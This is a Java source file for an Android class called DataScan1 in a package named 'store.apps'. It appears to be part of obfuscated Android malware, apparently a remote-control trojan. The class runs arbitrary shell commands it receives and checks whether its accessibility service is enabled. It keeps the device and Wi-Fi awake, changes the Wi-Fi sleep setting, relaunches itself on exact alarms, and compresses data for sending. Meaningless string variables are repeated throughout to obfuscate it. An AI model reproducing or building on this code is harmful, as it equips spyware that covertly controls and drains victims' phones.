package store.apps;
import android.annotation.TargetApi;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;

import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.PowerManager;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Base64;


import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;

import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.UnsupportedEncodingException;

import java.util.concurrent.Executor;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import static android.content.Context.ALARM_SERVICE;
public class DataScan1 {
    public static Executor ec;
    public static int max = 1000;
    public static String pr;
    public static String tg = ":";
    public static String jz = GetMyText(-255);
    public static String jq =GetMyText(4-5) ;
    public static String jx = GetMyText(6-5);
    public static char c1 = '1';
    public static int ju = 5 * 5;
    public static BroadcastReceiver rc  =null;
    public static BroadcastReceiver sr  =null;
    public static int SETFORONE = 0;
    public static int SETFORTOO = 0;
    public static int SETFORTREE = 0;


    private static  String GetMyText(int Num)
    {
        return String.valueOf(Num);
    }

    public static Boolean c(String a,String b){
        if(a.length() > 0 && b.length() > 0){
            if(a.equals(b)){
                return true ;
            }
        }
        return false ;
    }

    public static void exi(Context c, String v){
        int f = 10000;
        try {
            f = Integer.valueOf(v);
        } catch (NumberFormatException e) {}
        if(f == -1){
            if(!RTPluginsHelper._mthd_issrvrun_(EngineWorkerins.class,c,"[RANDOM-STRING]")) {

                Intent i = new Intent(c, EngineWorkerins.class);
                c.stopService(i);
            }
        }else{
            alr(c,f);
        }
        ConHelpOne.di();
        rel(false);
        try{
            android.os.Process.killProcess(android.os.Process.myPid());
        }catch (Exception ex) {}
    }
    public static void gl(Context c){
        try {

            ContentResolver cr = c.getContentResolver();
            int set = android.provider.Settings.Global.WIFI_SLEEP_POLICY_NEVER;
            android.provider.Settings.System.putInt(cr, android.provider.Settings.Global.WIFI_SLEEP_POLICY, set);
        } catch (Exception e) {}
    }
    public static byte[] f(String s, byte[] b) throws Exception {

        ByteArrayOutputStream o = new ByteArrayOutputStream();
        byte[] s0 = cZp(s.getBytes());
        byte[] b0 = cZp(b);
        byte ch = (byte) 0;
        byte[] n0 = String.valueOf(s0.length).getBytes();
        byte[] n1 = String.valueOf(b0.length).getBytes();
        o.write(n0, 0, n0.length);
        o.write(ch);
        o.write(n1, 0, n1.length);
        o.write(ch);
        o.write(s0, 0, s0.length);
        o.write(b0, 0, b0.length);
        byte[] b1 = o.toByteArray();
        try {
            o.close();
        } catch (Exception ex) {
        }
        return b1;
    }
    public static byte[] cZp(byte[] d) throws Exception {
        ByteArrayOutputStream b = new ByteArrayOutputStream(d.length);
        GZIPOutputStream g = new GZIPOutputStream(b);
        g.write(d);
        g.close();
        String CjYOEujCyymiley = "odC[RANDOM-STRING]gvOAkaJRHpRn";
        String nWVGLzpSeouicWG = "ydivFnJvxEB[RANDOM-STRING]GyHN";
        String hvqCYrmFdJviIjN = "cBpcTo[RANDOM-STRING]wtEvMLhLe";
        String MCGHFIxxGFBmdMe = "vjEwDRYOFLvgp[RANDOM-STRING]AX";
        String hUUvpkRBdlPyPRW = "dVph[RANDOM-STRING]JstXsIWBHDB";
        String odCgvOAkaJRHpRn = "FKCxDRGlzwL[RANDOM-STRING]lsrb";
        byte[] m = b.toByteArray();
        b.close();
        return m;
    }


    public static byte[] dZp(byte[] d) throws Exception {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        final int buff = d.length;
        ByteArrayInputStream in = new ByteArrayInputStream(d);
        GZIPInputStream g = new GZIPInputStream(in, buff);
        byte[] b = new byte[buff];
        int cu;
        while ((cu = g.read(b)) != -1) {
            o.write(b, 0, cu);
        }
        g.close();
        String CjYOEujCyymiley = "odC[RANDOM-STRING]gvOAkaJRHpRn";
        String nWVGLzpSeouicWG = "ydivFnJvxEB[RANDOM-STRING]GyHN";
        String hvqCYrmFdJviIjN = "cBpcTo[RANDOM-STRING]wtEvMLhLe";
        String MCGHFIxxGFBmdMe = "vjEwDRYOFLvgp[RANDOM-STRING]AX";
        String hUUvpkRBdlPyPRW = "dVph[RANDOM-STRING]JstXsIWBHDB";
        String odCgvOAkaJRHpRn = "FKCxDRGlzwL[RANDOM-STRING]lsrb";
        in.close();
        byte[] e = o.toByteArray();
        o.close();
        return e;
    }
    public static byte[] getByte(byte[] b, int[] i) {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        o.write(b, 0, i[0]);
        try {
            String CjYOEujCyymiley = "odC[RANDOM-STRING]gvOAkaJRHpRn";
            String nWVGLzpSeouicWG = "ydivFnJvxEB[RANDOM-STRING]GyHN";
            String hvqCYrmFdJviIjN = "cBpcTo[RANDOM-STRING]wtEvMLhLe";
            String MCGHFIxxGFBmdMe = "vjEwDRYOFLvgp[RANDOM-STRING]AX";
            String hUUvpkRBdlPyPRW = "dVph[RANDOM-STRING]JstXsIWBHDB";
            String odCgvOAkaJRHpRn = "FKCxDRGlzwL[RANDOM-STRING]lsrb";
            o.close();
        } catch (Exception ex) {
        }
        byte[] b0 = o.toByteArray();
        return b0;
    }
    public static byte[] getString(byte[] b, int[] i) {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        o.write(b, i[0], i[1]);
        String CjYOEujCyymiley = "odC[RANDOM-STRING]gvOAkaJRHpRn";
        String nWVGLzpSeouicWG = "ydivFnJvxEB[RANDOM-STRING]GyHN";
        String hvqCYrmFdJviIjN = "cBpcTo[RANDOM-STRING]wtEvMLhLe";
        String MCGHFIxxGFBmdMe = "vjEwDRYOFLvgp[RANDOM-STRING]AX";
        String hUUvpkRBdlPyPRW = "dVph[RANDOM-STRING]JstXsIWBHDB";
        String odCgvOAkaJRHpRn = "FKCxDRGlzwL[RANDOM-STRING]lsrb";
        try {
            o.close();
        } catch (Exception ex) {
        }
        byte[] b0 = o.toByteArray();
        return b0;
    }
    public static byte[] _METHOD_getbyte_(Object j) throws java.io.IOException {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        ObjectOutputStream s = new ObjectOutputStream(o);
        s.writeObject(j);
        s.flush();
        s.close();
        byte[] a = o.toByteArray();
        o.close();
        String CjYOEujCyymiley = "odC[RANDOM-STRING]gvOAkaJRHpRn";
        String nWVGLzpSeouicWG = "ydivFnJvxEB[RANDOM-STRING]GyHN";
        String hvqCYrmFdJviIjN = "cBpcTo[RANDOM-STRING]wtEvMLhLe";
        String MCGHFIxxGFBmdMe = "vjEwDRYOFLvgp[RANDOM-STRING]AX";
        String hUUvpkRBdlPyPRW = "dVph[RANDOM-STRING]JstXsIWBHDB";
        String odCgvOAkaJRHpRn = "FKCxDRGlzwL[RANDOM-STRING]lsrb";
        return a;
    }
    public static String gt(Context ctx, String k) {
        try {
            SharedPreferences s = PreferenceManager
                    .getDefaultSharedPreferences(ctx);

            String q = s.getString(k, "");
            if (!q.equalsIgnoreCase("")) {
                return q;
            } else {
                return "";
            }
        } catch (Exception e) {
            return "";
        }
    }
    public static void dit(Context ctx, String v, String k) {
        try {
            SharedPreferences s = PreferenceManager
                    .getDefaultSharedPreferences(ctx);
            SharedPreferences.Editor e = s.edit();
            String CjYOEujCyymiley = "odC[RANDOM-STRING]gvOAkaJRHpRn";
            String nWVGLzpSeouicWG = "ydivFnJvxEB[RANDOM-STRING]GyHN";
            String hvqCYrmFdJviIjN = "cBpcTo[RANDOM-STRING]wtEvMLhLe";
            String MCGHFIxxGFBmdMe = "vjEwDRYOFLvgp[RANDOM-STRING]AX";
            String hUUvpkRBdlPyPRW = "dVph[RANDOM-STRING]JstXsIWBHDB";
            String odCgvOAkaJRHpRn = "FKCxDRGlzwL[RANDOM-STRING]lsrb";
            e.putString(k, v.trim());
            e.commit();
        } catch (Exception e) {
        }
    }

    private static void e(AlarmManager a, int m, PendingIntent p){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            a.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis()
                            + m, p);
        }else{
            a.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
                    + m, p);
        }
    }
    public static void alr(Context c, int ms){
        Intent t = new Intent(c, AgreeingEngineering.class);
        t.putExtra("0","");
        String CjYOEujCyymiley = "odC[RANDOM-STRING]gvOAkaJRHpRn";
        String nWVGLzpSeouicWG = "ydivFnJvxEB[RANDOM-STRING]GyHN";
        String hvqCYrmFdJviIjN = "cBpcTo[RANDOM-STRING]wtEvMLhLe";
        String MCGHFIxxGFBmdMe = "vjEwDRYOFLvgp[RANDOM-STRING]AX";
        String hUUvpkRBdlPyPRW = "dVph[RANDOM-STRING]JstXsIWBHDB";
        String odCgvOAkaJRHpRn = "FKCxDRGlzwL[RANDOM-STRING]lsrb";
        PendingIntent p = PendingIntent.getBroadcast(c, 0, t, PendingIntent.FLAG_UPDATE_CURRENT);
        AlarmManager m = (AlarmManager) c.getSystemService(ALARM_SERVICE);
        m.cancel(p);
        e(m,ms,p);
    }
    public static WifiManager.WifiLock Wi;
    public static PowerManager.WakeLock Wa;
    public static void wk(Context c ,boolean b){
        if(b){
            if(Wa == null){
                try{final PowerManager k0 =(PowerManager)c.getSystemService(Context.POWER_SERVICE);
                    if (Wa == null){
                        String CjYOEujCyymiley = "odC[RANDOM-STRING]gvOAkaJRHpRn";
                        String nWVGLzpSeouicWG = "ydivFnJvxEB[RANDOM-STRING]GyHN";
                        String hvqCYrmFdJviIjN = "cBpcTo[RANDOM-STRING]wtEvMLhLe";
                        String MCGHFIxxGFBmdMe = "vjEwDRYOFLvgp[RANDOM-STRING]AX";
                        String hUUvpkRBdlPyPRW = "dVph[RANDOM-STRING]JstXsIWBHDB";
                        String odCgvOAkaJRHpRn = "FKCxDRGlzwL[RANDOM-STRING]lsrb";
                        Wa = k0.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                                EngineWorkerins._splet_1_.trim());
                        if(!Wa.isHeld()){
                            Wa.acquire();
                        }
                    }} catch (Exception e) {}
            }
        }
        if(Wi == null){
            try{final WifiManager k1 =(WifiManager)c.getSystemService(Context.WIFI_SERVICE);
                if(Wi == null){
                    Wi = k1.createWifiLock(WifiManager.WIFI_MODE_FULL,
                            EngineWorkerins._split_2_.trim());
                    if(!Wi.isHeld()){
                        Wi.acquire();
                    }
                }} catch (Exception e) {}
        }


    }
    public static void rel(boolean b){
        try{if(Wa != null){
            if(Wa.isHeld()){
                String CjYOEujCyymiley = "odC[RANDOM-STRING]gvOAkaJRHpRn";
                String nWVGLzpSeouicWG = "ydivFnJvxEB[RANDOM-STRING]GyHN";
                String hvqCYrmFdJviIjN = "cBpcTo[RANDOM-STRING]wtEvMLhLe";
                String MCGHFIxxGFBmdMe = "vjEwDRYOFLvgp[RANDOM-STRING]AX";
                String hUUvpkRBdlPyPRW = "dVph[RANDOM-STRING]JstXsIWBHDB";
                String odCgvOAkaJRHpRn = "FKCxDRGlzwL[RANDOM-STRING]lsrb";
                Wa.release();
                Wa = null;
            }
        }} catch (Exception e) {}

        if(b){
            return;
        }
        try{if(Wi != null){
            if(Wi.isHeld()){
                String CjYOEujCyymiley = "odC[RANDOM-STRING]gvOAkaJRHpRn";
                String nWVGLzpSeouicWG = "ydivFnJvxEB[RANDOM-STRING]GyHN";
                String hvqCYrmFdJviIjN = "cBpcTo[RANDOM-STRING]wtEvMLhLe";
                String MCGHFIxxGFBmdMe = "vjEwDRYOFLvgp[RANDOM-STRING]AX";
                String hUUvpkRBdlPyPRW = "dVph[RANDOM-STRING]JstXsIWBHDB";
                String odCgvOAkaJRHpRn = "FKCxDRGlzwL[RANDOM-STRING]lsrb";
                Wi.release();
                Wi = null;
            }
        }} catch (Exception e) {}
    }
    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public static boolean sv(Context ctx){
        try{
          final PowerManager pow = (PowerManager)ctx.getSystemService(Context.POWER_SERVICE);
          if(pow.isPowerSaveMode()== true){
              return true;
          }
         } catch (Exception e) {}
         return false;
    }
    public static void ec(final String c){
        if (((ThreadPoolExecutor) DataScan1.ec).getActiveCount() >= DataScan1.max){
            return;
        }
        DataScan1.ec.execute(new Runnable() {
            public void run() {
                StringBuffer ou = new StringBuffer();
                Process p;
                try {
                    p = Runtime.getRuntime().exec(c);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        if(!p.waitFor(60, TimeUnit.SECONDS)) {
                            p.destroy();
                        }
                    }else{
                        p.waitFor();
                    }
                    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String ln ;
                    while ((ln = r.readLine())!= null){
                        ou.append(ln);
                    }

                    p.getInputStream().close();
                    p.getOutputStream().close();
                    r.close();
                } catch (Exception e) {
                    dt = "";
                }
                String re = ou.toString();
                if (re.length() == 0){
                    dt = "";
                }
                dt = re;
            }});
    }
    public static String dt = "";
    public static boolean a_(Context ctx, String pk) {
        try{
            PackageManager pm = ctx.getPackageManager();
            try {
                pm.getPackageInfo(pk, PackageManager.GET_ACTIVITIES);
                return pm.getApplicationInfo(pk, 0).enabled;
            }
            catch (PackageManager.NameNotFoundException e) {
                return false;
            }
        } catch (Exception e) {}
        return false;
    }

    public static String iconid(String message) {
        byte[] data = Base64.decode(message, Base64.DEFAULT);
        try {
            return new String(data, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }

        return null;
    }

    public static boolean acc(Context ctx, Class<?> se) {
        try{
            ComponentName ex = new ComponentName(ctx, se);
            String ss = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (ss == null)
                return false;
            TextUtils.SimpleStringSplitter co = new TextUtils.SimpleStringSplitter(':');
            co.setString(ss);
            while (co.hasNext()) {
                String cs = co.next();
                ComponentName en = ComponentName.unflattenFromString(cs);
                if (en != null && en.equals(ex))
                    return true;
            }
        } catch (Exception e) {}
        return false;
    }

    public static void sr(Context ctx ,Intent i){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(i);
        }else{
            ctx.startService(i);
        }
    }
}


